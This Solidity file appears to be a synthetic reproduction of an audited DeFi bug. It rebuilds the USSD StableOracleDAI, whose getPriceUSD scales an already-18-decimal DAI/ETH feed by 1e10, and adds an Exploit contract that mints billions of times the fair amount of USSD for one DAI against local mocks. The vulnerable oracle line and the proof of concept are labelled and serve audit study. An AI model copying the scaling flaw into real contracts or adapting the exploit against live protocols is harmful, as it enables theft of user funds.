// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  USSD — StableOracleDAI.getPriceUSD scales an already-18-decimal DAI/ETH
    feed by 1e10 (Sherlock 2023-05, finding 19133).
    SYNTHETIC, cheatcode-free. The return expression is the audited line (@> VULN).
    Root cause: Chainlink DAI/ETH is 18 decimals, but the oracle treats it as
    8 and multiplies by 1e10. DAI's USD price collapses ~5e9×, so mintForToken
    mints that many more USSD per DAI. */

contract MiniToken {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// Both legs the oracle reads. Values are 18-decimal, matching the real feeds.
contract PriceFeeds {
    function getPriceUSD() external pure returns (uint256) {
        return 2e18;
    }

    function quoteSpecificPoolsWithTimePeriod(
        uint256,
        address,
        address,
        address[] calldata,
        uint32
    ) external pure returns (uint256) {
        return 2e18;
    }

    function latestRoundData() external pure returns (uint80, int256, uint256, uint256, uint80) {
        return (1, int256(2e18), 0, 0, 1);
    }
}

interface IDAIEthOracle {
    function quoteSpecificPoolsWithTimePeriod(
        uint256 amount,
        address baseToken,
        address quoteToken,
        address[] calldata pools,
        uint32 period
    ) external view returns (uint256);
}

interface IEthUsdOracle {
    function getPriceUSD() external view returns (uint256);
}

interface IDAIETHFeed {
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80);
}

contract StableOracleDAI {
    IDAIEthOracle public DAIEthOracle;
    IEthUsdOracle public ethOracle;
    IDAIETHFeed public priceFeedDAIETH;

    constructor(address feeds) {
        DAIEthOracle = IDAIEthOracle(feeds);
        ethOracle = IEthUsdOracle(feeds);
        priceFeedDAIETH = IDAIETHFeed(feeds);
    }

    /// Audited body. The `* 1e10` is the bug (Chainlink DAI/ETH is already 18 decimals).
    function getPriceUSD() external view returns (uint256) {
        address[] memory pools = new address[](1);
        pools[0] = 0x60594a405d53811d3BC4766596EFD80fd545A270;
        uint256 DAIWethPrice = DAIEthOracle.quoteSpecificPoolsWithTimePeriod(
            1000000000000000000, // 1 Eth
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
            pools,
            600
        );
        uint256 wethPriceUSD = ethOracle.getPriceUSD();
        (, int256 price,,,) = priceFeedDAIETH.latestRoundData();
        // @> VULN: `price` is 18 decimals; `* 1e10` treats it as 8 and collapses DAI/USD.
        return (wethPriceUSD * 1e18) / ((DAIWethPrice + uint256(price) * 1e10) / 2);
    }
}

contract USSDMinter {
    MiniToken public dai;
    MiniToken public ussd;
    StableOracleDAI public oracle;

    constructor(address _dai, address _ussd, address _oracle) {
        dai = MiniToken(_dai);
        ussd = MiniToken(_ussd);
        oracle = StableOracleDAI(_oracle);
    }

    function mintForToken(uint256 daiAmount) external {
        uint256 price = oracle.getPriceUSD();
        uint256 ussdOut = daiAmount * 1e18 / price;
        dai.transferFrom(msg.sender, address(this), daiAmount);
        ussd.mint(msg.sender, ussdOut);
    }
}

contract Exploit {
    // 1 DAI at the buggy price. Fair mint is 1e18 USSD; this is ~5.000000024e27.
    uint256 public constant BUGGY_MINT = 5000000025000000125000000625;

    PriceFeeds public feeds; // nonce 1
    StableOracleDAI public oracle; // nonce 2
    MiniToken public dai; // nonce 3
    MiniToken public ussd; // nonce 4
    USSDMinter public minter; // nonce 5

    constructor() {
        feeds = new PriceFeeds();
        oracle = new StableOracleDAI(address(feeds));
        dai = new MiniToken("Dai", "DAI", 18);
        ussd = new MiniToken("USSD", "USSD", 18);
        minter = new USSDMinter(address(dai), address(ussd), address(oracle));
        dai.mint(address(this), 1e18);
    }

    function run() external {
        dai.approve(address(minter), 1e18);
        minter.mintForToken(1e18);
        require(ussd.balanceOf(address(this)) == BUGGY_MINT, "overmint");
        require(ussd.balanceOf(address(this)) > 1e18 * 1e9, "not orders of magnitude over fair");
    }
}
